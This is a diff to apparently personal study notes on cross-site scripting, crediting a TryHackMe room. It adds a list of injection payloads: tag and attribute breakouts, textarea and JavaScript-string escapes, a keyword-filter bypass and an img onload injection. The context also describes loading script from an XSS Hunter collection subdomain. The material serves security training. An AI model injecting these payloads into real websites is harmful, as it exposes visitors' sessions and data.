@@ -4,4 +4,26 @@ XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities,
 
 Upon signing up you will create a special xss.ht short domain such as yoursubdomain.xss.ht which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing, using injection attempts such as "><script src=//yoursubdomain.xss.ht></script>. XSS Hunter will automatically serve up XSS probes and collect the resulting information when they fire.
 
-[hat tip: Try Hack Me]
+[hat tip: TryHackMe]
+----------------------------------------------------
+XSS Payloads:
+
+basic
+<script>alert('XSS');</script>
+
+escape insert tab - ">
+"><script>alert('XSS');</script>
+
+escape text area - </textarea>
+</textarea><script>alert('XSS');</script>
+
+escape JavaScript command - '; ____ //
+';alert('XSS');//
+
+bypassing filter that filters out the word script - sscriptcript
+<sscriptcript>alert('XSS');</sscriptcript>
+
+escape IMG tag - onload=
+/NAME_OF_FOLDER/NAME_OF_FILE.jpg" onload="alert('XSS');
+
+[hat tip: TryHackMe - https://tryhackme.com/room/xssgi]
